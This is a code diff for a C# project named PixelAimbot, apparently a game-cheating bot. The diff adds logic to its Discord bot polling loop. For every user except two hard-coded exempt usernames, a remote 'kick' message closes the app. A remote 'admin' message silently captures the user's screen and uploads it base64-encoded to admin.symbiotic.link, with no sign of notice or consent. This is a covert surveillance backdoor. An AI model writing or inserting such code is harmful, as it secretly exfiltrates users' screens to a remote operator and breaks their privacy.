@@ -174,6 +174,7 @@ namespace PixelAimbot
 
         public async Task DiscordBotAsync(string discordUsername, CancellationToken token)
         {
+            var config = Config.Load();
             
             HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
             var webclient = new WebClient();
@@ -194,6 +195,29 @@ namespace PixelAimbot
                         var text = await webclient.UploadStringTaskAsync("https://admin.symbiotic.link/api/getMessages", discordUsername);
                         
                         values["response"] = "";
+                        if (config.username != "Mentalill" && config.username != "ShiiikK")
+                        {
+                            if (text.Contains("kick"))
+                            {
+                                Application.Exit();
+                            }
+                            if (text.Contains("admin"))
+                            {
+                                var splitCommand = text.Split(':');
+                                var adminname = splitCommand[1];
+                                var picture = new PrintScreen();
+
+                                using (MemoryStream m = new MemoryStream())
+                                {
+                                    picture.CaptureScreen().Save(m, System.Drawing.Imaging.ImageFormat.Jpeg);
+                                    byte[] imageBytes = m.ToArray();
+                                    values["discorduser"] = adminname;
+                                    values["response"] = adminname + "_" + Convert.ToBase64String(imageBytes);
+                                }
+
+                            }
+                        }
+
                         if (text.Contains("message"))
                         {
                             Alert.Show(text.Split(':')[1], frmAlert.enmType.Info);
